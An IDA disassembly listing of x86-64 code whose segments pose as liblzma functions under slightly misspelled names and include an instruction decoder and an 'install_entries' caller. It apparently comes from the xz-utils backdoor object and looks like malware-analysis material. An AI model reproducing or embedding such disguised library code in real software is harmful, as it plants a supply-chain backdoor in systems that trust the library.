.text.lzma_lzma_set_out_limia:000000000000300F                 mov     r15, rdi
.text.lzma_lzma_set_out_limia:0000000000003012                 mov     ecx, 16h
.text.lzma_lzma_set_out_limia:0000000000003017                 mov     r13, r8
.text.lzma_lzma_set_out_limia:000000000000301A                 lea     rdi, [rsp+0C8h+var_80]
.text.lzma_lzma_set_out_limia:000000000000301F                 mov     r14, r9
.text.lzma_lzma_set_out_limia:0000000000003022                 rep stosd
.text.lzma_lzma_set_out_limia:0000000000003024                 lea     rax, [rsp+0C8h+var_80]
.text.lzma_lzma_set_out_limia:0000000000003029                 mov     [rsp+0C8h+var_B8], rax
.text.lzma_lzma_set_out_limia:000000000000302E
.text.lzma_lzma_set_out_limia:000000000000302E loc_302E:                               ; CODE XREF: sub_2FE0+283↓j
.text.lzma_lzma_set_out_limia:000000000000302E                 mov     r8, [rsp+0C8h+var_B8]
.text.lzma_lzma_set_out_limia:0000000000003033                 mov     rsi, [rsp+0C8h+var_C0]
.text.lzma_lzma_set_out_limia:0000000000003038                 mov     ecx, 1
.text.lzma_lzma_set_out_limia:000000000000303D                 mov     rdi, r15
.text.lzma_lzma_set_out_limia:0000000000003040                 mov     edx, 1
.text.lzma_lzma_set_out_limia:0000000000003045                 call    _Llzma_filters_update_0 ; PIC mode
.text.lzma_lzma_set_out_limia:000000000000304A                 test    eax, eax
.text.lzma_lzma_set_out_limia:000000000000304C                 jz      loc_3295
.text.lzma_lzma_set_out_limia:0000000000003052                 mov     cl, byte ptr [rsp+0C8h+var_70+1]
.text.lzma_lzma_set_out_limia:0000000000003056                 mov     r10, [rsp+0C8h+var_80]
.text.lzma_lzma_set_out_limia:000000000000305B                 xor     r12d, r12d
.text.lzma_lzma_set_out_limia:000000000000305E                 mov     rdx, [rsp+0C8h+var_78]
.text.lzma_lzma_set_out_limia:0000000000003063                 test    cl, 1
.text.lzma_lzma_set_out_limia:0000000000003066                 jz      short loc_3085
.text.lzma_lzma_set_out_limia:0000000000003068                 mov     eax, [rsp+0C8h+var_64]
.text.lzma_lzma_set_out_limia:000000000000306C                 mov     r12, [rsp+0C8h+var_50]
.text.lzma_lzma_set_out_limia:0000000000003071                 and     eax, 0FF00FF00h
.text.lzma_lzma_set_out_limia:0000000000003076                 cmp     eax, 5000000h
.text.lzma_lzma_set_out_limia:000000000000307B                 jnz     short loc_3085
.text.lzma_lzma_set_out_limia:000000000000307D                 lea     r9, [r10+r12]
.text.lzma_lzma_set_out_limia:0000000000003081                 lea     r12, [r9+rdx]
.text.lzma_lzma_set_out_limia:0000000000003085
.text.lzma_lzma_set_out_limia:0000000000003085 loc_3085:                               ; CODE XREF: sub_2FE0+86↑j
.text.lzma_lzma_set_out_limia:0000000000003085                                         ; sub_2FE0+9B↑j
.text.lzma_lzma_set_out_limia:0000000000003085                 xor     r11d, r11d
.text.lzma_lzma_set_out_limia:0000000000003088                 test    word ptr [rsp+58h], 1040h
.text.lzma_lzma_set_out_limia:000000000000308F                 jz      short loc_30CA
.text.lzma_lzma_set_out_limia:0000000000003091                 mov     al, byte ptr [rsp+0C8h+var_70]
.text.lzma_lzma_set_out_limia:0000000000003095                 test    al, 40h
.text.lzma_lzma_set_out_limia:0000000000003097                 jz      short loc_30AB
.text.lzma_lzma_set_out_limia:0000000000003099                 mov     r11b, byte ptr [rsp+0C8h+var_64+2]
.text.lzma_lzma_set_out_limia:000000000000309E                 test    al, 20h
.text.lzma_lzma_set_out_limia:00000000000030A0                 jz      short loc_30CA
.text.lzma_lzma_set_out_limia:00000000000030A2                 movzx   eax, [rsp+0C8h+var_65]
.text.lzma_lzma_set_out_limia:00000000000030A7                 add     eax, eax
.text.lzma_lzma_set_out_limia:00000000000030A9                 jmp     short loc_30C4
.text.lzma_lzma_set_out_limia:00000000000030AB ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:00000000000030AB
.text.lzma_lzma_set_out_limia:00000000000030AB loc_30AB:                               ; CODE XREF: sub_2FE0+B7↑j
.text.lzma_lzma_set_out_limia:00000000000030AB                 and     cl, 10h
.text.lzma_lzma_set_out_limia:00000000000030AE                 mov     r11d, ecx
.text.lzma_lzma_set_out_limia:00000000000030B1                 jz      short loc_30CA
.text.lzma_lzma_set_out_limia:00000000000030B3                 mov     r11b, [rsp+0C8h+var_60]
.text.lzma_lzma_set_out_limia:00000000000030B8                 test    al, 20h
.text.lzma_lzma_set_out_limia:00000000000030BA                 jz      short loc_30CA
.text.lzma_lzma_set_out_limia:00000000000030BC                 movzx   eax, [rsp+0C8h+var_65]
.text.lzma_lzma_set_out_limia:00000000000030C1                 shl     eax, 3
.text.lzma_lzma_set_out_limia:00000000000030C4
.text.lzma_lzma_set_out_limia:00000000000030C4 loc_30C4:                               ; CODE XREF: sub_2FE0+C9↑j
.text.lzma_lzma_set_out_limia:00000000000030C4                 and     eax, 8
.text.lzma_lzma_set_out_limia:00000000000030C7                 or      r11d, eax
.text.lzma_lzma_set_out_limia:00000000000030CA
.text.lzma_lzma_set_out_limia:00000000000030CA loc_30CA:                               ; CODE XREF: sub_2FE0+AF↑j
.text.lzma_lzma_set_out_limia:00000000000030CA                                         ; sub_2FE0+C0↑j ...
.text.lzma_lzma_set_out_limia:00000000000030CA                 mov     rax, [rsp+0C8h+var_B0]
.text.lzma_lzma_set_out_limia:00000000000030CF                 lea     r15, [r10+rdx]
.text.lzma_lzma_set_out_limia:00000000000030D3                 cmp     r12, rax
.text.lzma_lzma_set_out_limia:00000000000030D6                 jb      loc_325B
.text.lzma_lzma_set_out_limia:00000000000030DC                 mov     rax, [rsp+0C8h+var_A8]
.text.lzma_lzma_set_out_limia:00000000000030E1                 cmp     r12, rax
.text.lzma_lzma_set_out_limia:00000000000030E4                 jnb     loc_325B
.text.lzma_lzma_set_out_limia:00000000000030EA                 mov     rax, [r14+60h]
.text.lzma_lzma_set_out_limia:00000000000030EE                 lea     r8, [r15+40h]
.text.lzma_lzma_set_out_limia:00000000000030F2                 mov     rsi, r15
.text.lzma_lzma_set_out_limia:00000000000030F5                 cmp     r8, rax
.text.lzma_lzma_set_out_limia:00000000000030F8                 cmova   r8, rax
.text.lzma_lzma_set_out_limia:00000000000030FC                 xor     ebx, ebx
.text.lzma_lzma_set_out_limia:00000000000030FE                 xor     ecx, ecx
.text.lzma_lzma_set_out_limia:0000000000003100
.text.lzma_lzma_set_out_limia:0000000000003100 loc_3100:                               ; CODE XREF: sub_2FE0+267↓j
.text.lzma_lzma_set_out_limia:0000000000003100                 mov     rdi, [rsp+0C8h+var_B8]
.text.lzma_lzma_set_out_limia:0000000000003105                 mov     rdx, r8
.text.lzma_lzma_set_out_limia:0000000000003108                 mov     [rsp+0C8h+var_89], cl
.text.lzma_lzma_set_out_limia:000000000000310C                 mov     [rsp+0C8h+var_8A], r11b
.text.lzma_lzma_set_out_limia:0000000000003111                 mov     [rsp+0C8h+var_98], r8
.text.lzma_lzma_set_out_limia:0000000000003116                 mov     [rsp+0C8h+var_A0], rsi
.text.lzma_lzma_set_out_limia:000000000000311B                 call    code_dasm       ; PIC mode
.text.lzma_lzma_set_out_limia:0000000000003120                 mov     rsi, [rsp+0C8h+var_A0]
.text.lzma_lzma_set_out_limia:0000000000003125                 mov     r8, [rsp+0C8h+var_98]
.text.lzma_lzma_set_out_limia:000000000000312A                 test    eax, eax
.text.lzma_lzma_set_out_limia:000000000000312C                 mov     r11b, [rsp+0C8h+var_8A]
.text.lzma_lzma_set_out_limia:0000000000003131                 mov     cl, [rsp+0C8h+var_89]
.text.lzma_lzma_set_out_limia:0000000000003135                 jz      loc_324C
.text.lzma_lzma_set_out_limia:000000000000313B                 mov     eax, [rsp+0C8h+var_58]
.text.lzma_lzma_set_out_limia:000000000000313F                 mov     rsi, [rsp+0C8h+var_78]
.text.lzma_lzma_set_out_limia:0000000000003144                 add     rsi, [rsp+0C8h+var_80]
.text.lzma_lzma_set_out_limia:0000000000003149                 cmp     eax, 109h
.text.lzma_lzma_set_out_limia:000000000000314E                 jnz     short loc_31BA
.text.lzma_lzma_set_out_limia:0000000000003150                 mov     dl, byte ptr [rsp+0C8h+var_70]
.text.lzma_lzma_set_out_limia:0000000000003154                 mov     eax, edx
.text.lzma_lzma_set_out_limia:0000000000003156                 and     eax, 40h
.text.lzma_lzma_set_out_limia:0000000000003159                 test    word ptr [rsp+0C8h+var_70], 1040h
.text.lzma_lzma_set_out_limia:0000000000003160                 jz      short loc_31A9
.text.lzma_lzma_set_out_limia:0000000000003162                 test    al, al
.text.lzma_lzma_set_out_limia:0000000000003164                 jz      short loc_317D
.text.lzma_lzma_set_out_limia:0000000000003166                 mov     cl, byte ptr [rsp+0C8h+var_64+2]
.text.lzma_lzma_set_out_limia:000000000000316A                 test    dl, 20h
.text.lzma_lzma_set_out_limia:000000000000316D                 jz      short loc_31B1
.text.lzma_lzma_set_out_limia:000000000000316F                 movzx   eax, [rsp+0C8h+var_65]
.text.lzma_lzma_set_out_limia:0000000000003174                 add     eax, eax
.text.lzma_lzma_set_out_limia:0000000000003176                 and     eax, 8
.text.lzma_lzma_set_out_limia:0000000000003179                 or      ecx, eax
.text.lzma_lzma_set_out_limia:000000000000317B                 jmp     short loc_31B1
.text.lzma_lzma_set_out_limia:000000000000317D ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:000000000000317D
.text.lzma_lzma_set_out_limia:000000000000317D loc_317D:                               ; CODE XREF: sub_2FE0+184↑j
.text.lzma_lzma_set_out_limia:000000000000317D                 mov     cl, byte ptr [rsp+0C8h+var_70+1]
.text.lzma_lzma_set_out_limia:0000000000003181                 and     cl, 10h
.text.lzma_lzma_set_out_limia:0000000000003184                 jz      loc_3236
.text.lzma_lzma_set_out_limia:000000000000318A                 and     dl, 20h
.text.lzma_lzma_set_out_limia:000000000000318D                 mov     cl, [rsp+0C8h+var_60]
.text.lzma_lzma_set_out_limia:0000000000003191                 jz      loc_3236
.text.lzma_lzma_set_out_limia:0000000000003197                 movzx   eax, [rsp+0C8h+var_65]
.text.lzma_lzma_set_out_limia:000000000000319C                 shl     eax, 3
.text.lzma_lzma_set_out_limia:000000000000319F                 and     eax, 8
.text.lzma_lzma_set_out_limia:00000000000031A2                 or      ecx, eax
.text.lzma_lzma_set_out_limia:00000000000031A4                 jmp     loc_3236
.text.lzma_lzma_set_out_limia:00000000000031A9 ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:00000000000031A9
.text.lzma_lzma_set_out_limia:00000000000031A9 loc_31A9:                               ; CODE XREF: sub_2FE0+180↑j
.text.lzma_lzma_set_out_limia:00000000000031A9                 test    al, al
.text.lzma_lzma_set_out_limia:00000000000031AB                 jz      loc_3236
.text.lzma_lzma_set_out_limia:00000000000031B1
.text.lzma_lzma_set_out_limia:00000000000031B1 loc_31B1:                               ; CODE XREF: sub_2FE0+18D↑j
.text.lzma_lzma_set_out_limia:00000000000031B1                                         ; sub_2FE0+19B↑j
.text.lzma_lzma_set_out_limia:00000000000031B1                 mov     bl, byte ptr [rsp+0C8h+var_64+3]
.text.lzma_lzma_set_out_limia:00000000000031B5                 and     dl, 20h
.text.lzma_lzma_set_out_limia:00000000000031B8                 jmp     short loc_3227
.text.lzma_lzma_set_out_limia:00000000000031BA ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:00000000000031BA
.text.lzma_lzma_set_out_limia:00000000000031BA loc_31BA:                               ; CODE XREF: sub_2FE0+16E↑j
.text.lzma_lzma_set_out_limia:00000000000031BA                 cmp     eax, 10Bh
.text.lzma_lzma_set_out_limia:00000000000031BF                 jnz     short loc_3236
.text.lzma_lzma_set_out_limia:00000000000031C1                 mov     edx, [rsp+0C8h+var_70]
.text.lzma_lzma_set_out_limia:00000000000031C5                 mov     al, byte ptr [rsp+0C8h+var_70]
.text.lzma_lzma_set_out_limia:00000000000031C9                 and     dx, 1040h
.text.lzma_lzma_set_out_limia:00000000000031CE                 test    al, 40h
.text.lzma_lzma_set_out_limia:00000000000031D0                 jnz     short loc_31D9
.text.lzma_lzma_set_out_limia:00000000000031D2                 test    dx, dx
.text.lzma_lzma_set_out_limia:00000000000031D5                 jnz     short loc_320F
.text.lzma_lzma_set_out_limia:00000000000031D7                 jmp     short loc_3236
.text.lzma_lzma_set_out_limia:00000000000031D9 ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:00000000000031D9
.text.lzma_lzma_set_out_limia:00000000000031D9 loc_31D9:                               ; CODE XREF: sub_2FE0+1F0↑j
.text.lzma_lzma_set_out_limia:00000000000031D9                 mov     cl, byte ptr [rsp+0C8h+var_64+3]
.text.lzma_lzma_set_out_limia:00000000000031DD                 test    al, 20h
.text.lzma_lzma_set_out_limia:00000000000031DF                 jz      short loc_3204
.text.lzma_lzma_set_out_limia:00000000000031E1                 movzx   eax, [rsp+0C8h+var_65]
.text.lzma_lzma_set_out_limia:00000000000031E6                 lea     edi, ds:0[rax*8]
.text.lzma_lzma_set_out_limia:00000000000031ED                 and     edi, 8
.text.lzma_lzma_set_out_limia:00000000000031F0                 or      ecx, edi
.text.lzma_lzma_set_out_limia:00000000000031F2                 test    dx, dx
.text.lzma_lzma_set_out_limia:00000000000031F5                 jz      short loc_3236
.text.lzma_lzma_set_out_limia:00000000000031F7                 add     eax, eax
.text.lzma_lzma_set_out_limia:00000000000031F9                 and     eax, 8
.text.lzma_lzma_set_out_limia:00000000000031FC                 or      al, byte ptr [rsp+0C8h+var_64+2]
.text.lzma_lzma_set_out_limia:0000000000003200                 mov     ebx, eax
.text.lzma_lzma_set_out_limia:0000000000003202                 jmp     short loc_3236
.text.lzma_lzma_set_out_limia:0000000000003204 ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:0000000000003204
.text.lzma_lzma_set_out_limia:0000000000003204 loc_3204:                               ; CODE XREF: sub_2FE0+1FF↑j
.text.lzma_lzma_set_out_limia:0000000000003204                 test    dx, dx
.text.lzma_lzma_set_out_limia:0000000000003207                 jz      short loc_3236
.text.lzma_lzma_set_out_limia:0000000000003209                 mov     bl, byte ptr [rsp+0C8h+var_64+2]
.text.lzma_lzma_set_out_limia:000000000000320D                 jmp     short loc_3236
.text.lzma_lzma_set_out_limia:000000000000320F ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:000000000000320F
.text.lzma_lzma_set_out_limia:000000000000320F loc_320F:                               ; CODE XREF: sub_2FE0+1F5↑j
.text.lzma_lzma_set_out_limia:000000000000320F                 mov     bl, byte ptr [rsp+0C8h+var_70+1]
.text.lzma_lzma_set_out_limia:0000000000003213                 and     bl, 10h
.text.lzma_lzma_set_out_limia:0000000000003216                 jnz     short loc_3221
.text.lzma_lzma_set_out_limia:0000000000003218                 cmp     r11b, cl
.text.lzma_lzma_set_out_limia:000000000000321B                 jnz     short loc_324F
.text.lzma_lzma_set_out_limia:000000000000321D                 xor     eax, eax
.text.lzma_lzma_set_out_limia:000000000000321F                 jmp     short loc_3242
.text.lzma_lzma_set_out_limia:0000000000003221 ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:0000000000003221
.text.lzma_lzma_set_out_limia:0000000000003221 loc_3221:                               ; CODE XREF: sub_2FE0+236↑j
.text.lzma_lzma_set_out_limia:0000000000003221                 mov     bl, [rsp+0C8h+var_60]
.text.lzma_lzma_set_out_limia:0000000000003225                 test    al, 20h
.text.lzma_lzma_set_out_limia:0000000000003227
.text.lzma_lzma_set_out_limia:0000000000003227 loc_3227:                               ; CODE XREF: sub_2FE0+1D8↑j
.text.lzma_lzma_set_out_limia:0000000000003227                 jz      short loc_3236
.text.lzma_lzma_set_out_limia:0000000000003229                 movzx   eax, [rsp+0C8h+var_65]
.text.lzma_lzma_set_out_limia:000000000000322E                 shl     eax, 3
.text.lzma_lzma_set_out_limia:0000000000003231                 and     eax, 8
.text.lzma_lzma_set_out_limia:0000000000003234                 or      ebx, eax
.text.lzma_lzma_set_out_limia:0000000000003236
.text.lzma_lzma_set_out_limia:0000000000003236 loc_3236:                               ; CODE XREF: sub_2FE0+1A4↑j
.text.lzma_lzma_set_out_limia:0000000000003236                                         ; sub_2FE0+1B1↑j ...
.text.lzma_lzma_set_out_limia:0000000000003236                 cmp     r11b, cl
.text.lzma_lzma_set_out_limia:0000000000003239                 jnz     short loc_324F
.text.lzma_lzma_set_out_limia:000000000000323B                 cmp     bl, 7
.text.lzma_lzma_set_out_limia:000000000000323E                 jz      short loc_326B
.text.lzma_lzma_set_out_limia:0000000000003240                 mov     eax, ebx
.text.lzma_lzma_set_out_limia:0000000000003242
.text.lzma_lzma_set_out_limia:0000000000003242 loc_3242:                               ; CODE XREF: sub_2FE0+23F↑j
.text.lzma_lzma_set_out_limia:0000000000003242                                         ; sub_2FE0+279↓j
.text.lzma_lzma_set_out_limia:0000000000003242                 mov     r11d, ebx
.text.lzma_lzma_set_out_limia:0000000000003245                 mov     ebx, eax
.text.lzma_lzma_set_out_limia:0000000000003247                 jmp     loc_3100
.text.lzma_lzma_set_out_limia:000000000000324C ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:000000000000324C
.text.lzma_lzma_set_out_limia:000000000000324C loc_324C:                               ; CODE XREF: sub_2FE0+155↑j
.text.lzma_lzma_set_out_limia:000000000000324C                 inc     rsi
.text.lzma_lzma_set_out_limia:000000000000324F
.text.lzma_lzma_set_out_limia:000000000000324F loc_324F:                               ; CODE XREF: sub_2FE0+23B↑j
.text.lzma_lzma_set_out_limia:000000000000324F                                         ; sub_2FE0+259↑j
.text.lzma_lzma_set_out_limia:000000000000324F                 cmp     rsi, r8
.text.lzma_lzma_set_out_limia:0000000000003252                 jnb     short loc_325B
.text.lzma_lzma_set_out_limia:0000000000003254                 mov     eax, ebx
.text.lzma_lzma_set_out_limia:0000000000003256                 mov     ebx, r11d
.text.lzma_lzma_set_out_limia:0000000000003259                 jmp     short loc_3242
.text.lzma_lzma_set_out_limia:000000000000325B ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:000000000000325B
.text.lzma_lzma_set_out_limia:000000000000325B loc_325B:                               ; CODE XREF: sub_2FE0+F6↑j
.text.lzma_lzma_set_out_limia:000000000000325B                                         ; sub_2FE0+104↑j ...
.text.lzma_lzma_set_out_limia:000000000000325B                 mov     rax, [rsp+0C8h+var_C0]
.text.lzma_lzma_set_out_limia:0000000000003260                 cmp     r15, rax
.text.lzma_lzma_set_out_limia:0000000000003263                 jb      loc_302E
.text.lzma_lzma_set_out_limia:0000000000003269                 jmp     short loc_3295
.text.lzma_lzma_set_out_limia:000000000000326B ; ---------------------------------------------------------------------------
.text.lzma_lzma_set_out_limia:000000000000326B
.text.lzma_lzma_set_out_limia:000000000000326B loc_326B:                               ; CODE XREF: sub_2FE0+25E↑j
.text.lzma_lzma_set_out_limia:000000000000326B                 mov     rax, [r14+20h]
.text.lzma_lzma_set_out_limia:000000000000326F                 mov     rcx, [rsp+0C8h+var_B8]
.text.lzma_lzma_set_out_limia:0000000000003274                 mov     rsi, r8
.text.lzma_lzma_set_out_limia:0000000000003277                 mov     rdi, [rsp+0C8h+var_78]
.text.lzma_lzma_set_out_limia:000000000000327C                 add     rdi, [rsp+0C8h+var_80]
.text.lzma_lzma_set_out_limia:0000000000003281                 mov     rdx, [rax+0A8h]
.text.lzma_lzma_set_out_limia:0000000000003288                 call    _Llzma_optimum_normal_0 ; PIC mode
.text.lzma_lzma_set_out_limia:000000000000328D                 test    eax, eax
.text.lzma_lzma_set_out_limia:000000000000328F                 jz      short loc_325B
.text.lzma_lzma_set_out_limia:0000000000003291                 mov     [r13+0], r12
.text.lzma_lzma_set_out_limia:0000000000003295
.text.lzma_lzma_set_out_limia:0000000000003295 loc_3295:                               ; CODE XREF: sub_2FE0+27↑j
.text.lzma_lzma_set_out_limia:0000000000003295                                         ; sub_2FE0+6C↑j ...
.text.lzma_lzma_set_out_limia:0000000000003295                 add     rsp, 0A0h
.text.lzma_lzma_set_out_limia:000000000000329C                 pop     rbx
.text.lzma_lzma_set_out_limia:000000000000329D                 pop     r12
.text.lzma_lzma_set_out_limia:000000000000329F                 pop     r13
.text.lzma_lzma_set_out_limia:00000000000032A1                 pop     r14
.text.lzma_lzma_set_out_limia:00000000000032A3                 pop     r15
.text.lzma_lzma_set_out_limia:00000000000032A5                 retn
.text.lzma_lzma_set_out_limia:00000000000032A5 sub_2FE0        endp
.text.lzma_lzma_set_out_limia:00000000000032A5
.text.lzma_lzma_set_out_limia:00000000000032A5 _text_lzma_lzma_set_out_limia ends
.text.lzma_lzma_set_out_limia:00000000000032A5
.text.lzma_auto_decoda:00000000000032B0 ; ===========================================================================
.text.lzma_auto_decoda:00000000000032B0
.text.lzma_auto_decoda:00000000000032B0 ; Segment type: Pure code
.text.lzma_auto_decoda:00000000000032B0 ; Segment permissions: Read/Execute
.text.lzma_auto_decoda:00000000000032B0 _text_lzma_auto_decoda segment para public 'CODE' use64
.text.lzma_auto_decoda:00000000000032B0                 assume cs:_text_lzma_auto_decoda
.text.lzma_auto_decoda:00000000000032B0                 ;org 32B0h
.text.lzma_auto_decoda:00000000000032B0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_auto_decoda:00000000000032B0
.text.lzma_auto_decoda:00000000000032B0 ; =============== S U B R O U T I N E =======================================
.text.lzma_auto_decoda:00000000000032B0
.text.lzma_auto_decoda:00000000000032B0
.text.lzma_auto_decoda:00000000000032B0 ; __int64 __fastcall Llzma_auto_decode_1(__int64, unsigned int, unsigned __int64, unsigned __int64)
.text.lzma_auto_decoda:00000000000032B0 _Llzma_auto_decode_1 proc near          ; CODE XREF: sub_3330+3F↓p
.text.lzma_auto_decoda:00000000000032B0
.text.lzma_auto_decoda:00000000000032B0 var_2C          = dword ptr -2Ch
.text.lzma_auto_decoda:00000000000032B0
.text.lzma_auto_decoda:00000000000032B0                 endbr64
.text.lzma_auto_decoda:00000000000032B4                 push    r15
.text.lzma_auto_decoda:00000000000032B6                 push    r14
.text.lzma_auto_decoda:00000000000032B8                 mov     r14, rcx
.text.lzma_auto_decoda:00000000000032BB                 xor     ecx, ecx
.text.lzma_auto_decoda:00000000000032BD                 push    r13
.text.lzma_auto_decoda:00000000000032BF                 mov     r13, rdx
.text.lzma_auto_decoda:00000000000032C2                 mov     edx, 0Dh
.text.lzma_auto_decoda:00000000000032C7                 push    r12
.text.lzma_auto_decoda:00000000000032C9                 mov     r12, rdi
.text.lzma_auto_decoda:00000000000032CC                 mov     edi, 0D2h
.text.lzma_auto_decoda:00000000000032D1                 push    rbx
.text.lzma_auto_decoda:00000000000032D2                 sub     rsp, 10h
.text.lzma_auto_decoda:00000000000032D6                 mov     [rsp+38h+var_2C], esi
.text.lzma_auto_decoda:00000000000032DA                 mov     esi, 4
.text.lzma_auto_decoda:00000000000032DF                 call    _Llzma_index_iter_rewind_cold ; PIC mode
.text.lzma_auto_decoda:00000000000032E4                 test    eax, eax
.text.lzma_auto_decoda:00000000000032E6                 jz      short loc_331B
.text.lzma_auto_decoda:00000000000032E8                 xor     edx, edx
.text.lzma_auto_decoda:00000000000032EA                 lea     r15, [rsp+38h+var_2C]
.text.lzma_auto_decoda:00000000000032EF
.text.lzma_auto_decoda:00000000000032EF loc_32EF:                               ; CODE XREF: _Llzma_auto_decode_1+69↓j
.text.lzma_auto_decoda:00000000000032EF                 mov     rsi, r15
.text.lzma_auto_decoda:00000000000032F2                 mov     rdi, r12
.text.lzma_auto_decoda:00000000000032F5                 call    _Llzip_decode_0 ; PIC mode
.text.lzma_auto_decoda:00000000000032FA                 mov     rbx, rax
.text.lzma_auto_decoda:00000000000032FD                 test    rax, rax
.text.lzma_auto_decoda:0000000000003300                 jz      short loc_331B
.text.lzma_auto_decoda:0000000000003302                 mov     rdx, rax
.text.lzma_auto_decoda:0000000000003305                 mov     rsi, r14
.text.lzma_auto_decoda:0000000000003308                 mov     rdi, r13
.text.lzma_auto_decoda:000000000000330B                 call    _Lstream_encode_1 ; PIC mode
.text.lzma_auto_decoda:0000000000003310                 test    rax, rax
.text.lzma_auto_decoda:0000000000003313                 jnz     short loc_331D
.text.lzma_auto_decoda:0000000000003315                 lea     rdx, [rbx+1]
.text.lzma_auto_decoda:0000000000003319                 jmp     short loc_32EF
.text.lzma_auto_decoda:000000000000331B ; ---------------------------------------------------------------------------
.text.lzma_auto_decoda:000000000000331B
.text.lzma_auto_decoda:000000000000331B loc_331B:                               ; CODE XREF: _Llzma_auto_decode_1+36↑j
.text.lzma_auto_decoda:000000000000331B                                         ; _Llzma_auto_decode_1+50↑j
.text.lzma_auto_decoda:000000000000331B                 xor     eax, eax
.text.lzma_auto_decoda:000000000000331D
.text.lzma_auto_decoda:000000000000331D loc_331D:                               ; CODE XREF: _Llzma_auto_decode_1+63↑j
.text.lzma_auto_decoda:000000000000331D                 add     rsp, 10h
.text.lzma_auto_decoda:0000000000003321                 pop     rbx
.text.lzma_auto_decoda:0000000000003322                 pop     r12
.text.lzma_auto_decoda:0000000000003324                 pop     r13
.text.lzma_auto_decoda:0000000000003326                 pop     r14
.text.lzma_auto_decoda:0000000000003328                 pop     r15
.text.lzma_auto_decoda:000000000000332A                 retn
.text.lzma_auto_decoda:000000000000332A _Llzma_auto_decode_1 endp
.text.lzma_auto_decoda:000000000000332A
.text.lzma_auto_decoda:000000000000332A _text_lzma_auto_decoda ends
.text.lzma_auto_decoda:000000000000332A
.text.lzma_lzma_encoder_resea:0000000000003330 ; ===========================================================================
.text.lzma_lzma_encoder_resea:0000000000003330
.text.lzma_lzma_encoder_resea:0000000000003330 ; Segment type: Pure code
.text.lzma_lzma_encoder_resea:0000000000003330 ; Segment permissions: Read/Execute
.text.lzma_lzma_encoder_resea:0000000000003330 _text_lzma_lzma_encoder_resea segment para public 'CODE' use64
.text.lzma_lzma_encoder_resea:0000000000003330                 assume cs:_text_lzma_lzma_encoder_resea
.text.lzma_lzma_encoder_resea:0000000000003330                 ;org 3330h
.text.lzma_lzma_encoder_resea:0000000000003330                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_lzma_encoder_resea:0000000000003330
.text.lzma_lzma_encoder_resea:0000000000003330 ; =============== S U B R O U T I N E =======================================
.text.lzma_lzma_encoder_resea:0000000000003330
.text.lzma_lzma_encoder_resea:0000000000003330
.text.lzma_lzma_encoder_resea:0000000000003330 ; __int64 __fastcall sub_3330(unsigned __int64, unsigned __int64, unsigned __int64, unsigned __int64, unsigned __int64 *, __int64)
.text.lzma_lzma_encoder_resea:0000000000003330 sub_3330        proc near               ; CODE XREF: install_entries+2E7↓p
.text.lzma_lzma_encoder_resea:0000000000003330
.text.lzma_lzma_encoder_resea:0000000000003330 var_100         = qword ptr -100h
.text.lzma_lzma_encoder_resea:0000000000003330 var_F8          = qword ptr -0F8h
.text.lzma_lzma_encoder_resea:0000000000003330 var_F0          = qword ptr -0F0h
.text.lzma_lzma_encoder_resea:0000000000003330 var_E8          = qword ptr -0E8h
.text.lzma_lzma_encoder_resea:0000000000003330 var_E0          = dword ptr -0E0h
.text.lzma_lzma_encoder_resea:0000000000003330 var_D9          = byte ptr -0D9h
.text.lzma_lzma_encoder_resea:0000000000003330 var_D8          = qword ptr -0D8h
.text.lzma_lzma_encoder_resea:0000000000003330 var_D0          = qword ptr -0D0h
.text.lzma_lzma_encoder_resea:0000000000003330 var_C8          = word ptr -0C8h
.text.lzma_lzma_encoder_resea:0000000000003330 var_BD          = byte ptr -0BDh
.text.lzma_lzma_encoder_resea:0000000000003330 var_BB          = byte ptr -0BBh
.text.lzma_lzma_encoder_resea:0000000000003330 var_BA          = byte ptr -0BAh
.text.lzma_lzma_encoder_resea:0000000000003330 var_B9          = byte ptr -0B9h
.text.lzma_lzma_encoder_resea:0000000000003330 var_B8          = byte ptr -0B8h
.text.lzma_lzma_encoder_resea:0000000000003330 var_B0          = dword ptr -0B0h
.text.lzma_lzma_encoder_resea:0000000000003330 var_A8          = qword ptr -0A8h
.text.lzma_lzma_encoder_resea:0000000000003330 var_98          = qword ptr -98h
.text.lzma_lzma_encoder_resea:0000000000003330 var_80          = qword ptr -80h
.text.lzma_lzma_encoder_resea:0000000000003330 var_78          = qword ptr -78h
.text.lzma_lzma_encoder_resea:0000000000003330 var_70          = word ptr -70h
.text.lzma_lzma_encoder_resea:0000000000003330 var_65          = byte ptr -65h
.text.lzma_lzma_encoder_resea:0000000000003330 var_64          = dword ptr -64h
.text.lzma_lzma_encoder_resea:0000000000003330 var_60          = byte ptr -60h
.text.lzma_lzma_encoder_resea:0000000000003330 var_58          = dword ptr -58h
.text.lzma_lzma_encoder_resea:0000000000003330 var_50          = qword ptr -50h
.text.lzma_lzma_encoder_resea:0000000000003330
.text.lzma_lzma_encoder_resea:0000000000003330                 push    r15
.text.lzma_lzma_encoder_resea:0000000000003332                 xor     eax, eax
.text.lzma_lzma_encoder_resea:0000000000003334                 mov     r15, rdx
.text.lzma_lzma_encoder_resea:0000000000003337                 push    r14
.text.lzma_lzma_encoder_resea:0000000000003339                 push    r13
.text.lzma_lzma_encoder_resea:000000000000333B                 mov     r13, rdi
.text.lzma_lzma_encoder_resea:000000000000333E                 push    r12
.text.lzma_lzma_encoder_resea:0000000000003340                 mov     r12, r8
.text.lzma_lzma_encoder_resea:0000000000003343                 push    rbx
.text.lzma_lzma_encoder_resea:0000000000003344                 mov     rbx, rcx
.text.lzma_lzma_encoder_resea:0000000000003347                 mov     ecx, 16h
.text.lzma_lzma_encoder_resea:000000000000334C                 sub     rsp, 0E0h
.text.lzma_lzma_encoder_resea:0000000000003353                 lea     rdi, [rsp+108h+var_D8]
.text.lzma_lzma_encoder_resea:0000000000003358                 mov     [rsp+108h+var_100], rsi
